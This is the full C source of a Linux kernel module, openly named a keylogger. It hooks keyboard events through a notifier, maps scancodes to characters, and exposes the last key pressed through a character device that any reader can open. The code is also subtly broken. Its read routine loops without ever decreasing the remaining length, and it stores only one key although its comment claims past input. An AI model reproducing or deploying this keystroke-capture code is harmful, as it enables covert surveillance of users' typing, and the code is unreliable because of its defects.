/* keylog - Creates a device  file that outputs past keyboard input
 */
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/kdev_t.h>
#include <linux/version.h>
#include <linux/keyboard.h>

#include <asm/uaccess.h>

#define DEV_NAME "chardev"    // Name as it appears in /proc/devices
#define BUF_LEN 80
#define DEVICE_CNT 1

static dev_t dev;
static struct class *cl;
static struct cdev c_dev;


static int Device_Open = 0;

static char prev_key;

// Fill callback structs
static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
static struct file_operations fops = {
    .read = device_read,
    .write = device_write,
    .open = device_open,
    .release = device_release,
};
int key_notify(struct notifier_block *nblock, unsigned long code, void *_param);
static struct notifier_block nb = {
    .notifier_call = key_notify
};

// Map keycodes to keys, subtract 1 from keycode before indexing (Esc = 1)
// 16 per line!
static char scanmap[55] = {
    'E', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', 'B', 'T', 'q', 'w',
    'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n', 'C', 'a', 's', 'd', 'f',
    'g', 'h', 'j', 'k', 'l', ';', '\'', '`', 'L', 'z', 'x', 'c', 'v', 'b', 'n', 'm',
    ',', '.', '/', 'R', '?', 'A', ' '
};

/* Called when module is loaded.
 */
static int __init keylog_init(void)
{
    // Register device with kernel, major number dynamically allocated
    int res = alloc_chrdev_region(&dev, 0, DEVICE_CNT, DEV_NAME);
    if (res < 0) {
        printk(KERN_ALERT "chardev: could not register a device\n");
        return res;
    }

    // Initialize struct class
    cl = class_create(THIS_MODULE, DEV_NAME);
    if (!cl) {
        printk(KERN_ALERT "chardev: could not create class\n");
        goto error1;
    }

    // Create device and register with sysfs
    if (device_create(cl, NULL, dev, NULL, DEV_NAME) == NULL) {
        printk(KERN_ALERT "chardev: could not create device\n");
        goto error2;
    }

    // Add the device to the file system
    cdev_init(&c_dev, &fops);
    if (cdev_add(&c_dev, dev, DEVICE_CNT) < 0) {
        printk(KERN_ALERT "chardev: could not create char device on sysfs\n");
        goto error3;
    }

    // Register keyboard notifier
    register_keyboard_notifier(&nb);
    return 0;
error3:
    device_destroy(cl, dev);
error2:
    class_destroy(cl);
error1:
    unregister_chrdev_region(dev, DEVICE_CNT);
    return -1;
}

/* Called when module is unloaded.
 */
static void __exit keylog_exit(void)
{
    cdev_del(&c_dev);
    device_destroy(cl, dev);
    class_destroy(cl);
    unregister_chrdev_region(dev, DEVICE_CNT);
    unregister_keyboard_notifier(&nb);
}

/* Called from notify block when a key is pressed.
 */
int key_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    struct vc_data *vc = param->vc;

    int ret = NOTIFY_OK;

    if (code == KBD_KEYCODE) {
        if (param->down) {
            if (param->value >= 55) {
                prev_key = '?';
            } else {
                prev_key = scanmap[param->value - 1];
            }
        }
    }

    return ret;
}

/* Called when a process tries to open the device file.
 * As is "cat /dev/mycharfile"
 */
static int device_open(struct inode *inode, struct file *file)
{
    if (Device_Open)
        return -EBUSY;
    Device_Open++;

    try_module_get(THIS_MODULE);

    return 0;
}

/* Called when a process closes the device file.
 */
static int device_release(struct inode *inode, struct file *file)
{
    Device_Open--;

    module_put(THIS_MODULE);

    return 0;
}

/* Called when a process, which has opened the device file, attempts to read
 * from it.
 */
static ssize_t device_read(struct file *file_ptr, char *buffer,
                           size_t length, loff_t *offset)
{
    int bytes_read = 0;

    while (length) {
        // Copy from kernel data segment to user data segment
        put_user(prev_key, buffer++);
        bytes_read++;
    }

    return bytes_read;
}

/* Called when a process tries to write to the device file.
 * As in "echo hi > /dev/chardev"
 */
static ssize_t device_write(struct file* file_ptr, const char *buff,
                            size_t len, loff_t *off)
{
    printk(KERN_ALERT "Sorry, this operation isn't supported.\n");
    return -EINVAL;
}

module_init(keylog_init);
module_exit(keylog_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Christopher Chin");
MODULE_DESCRIPTION("Prints keyboard events");
